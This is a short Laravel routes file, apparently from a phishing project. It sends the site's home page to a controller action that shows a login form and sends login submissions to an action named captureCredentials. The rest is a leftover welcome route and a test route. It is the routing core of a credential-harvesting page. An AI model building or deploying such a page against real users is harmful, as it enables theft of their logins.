<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PhishingController;

Route::get('/', function () {
    return view('welcome');
});


Route::get('/', [PhishingController::class, 'showLogin']);
Route::post('/login', [PhishingController::class, 'captureCredentials']);

Route::get('/test', function () {
    return 'Laravel está funcionando';
});
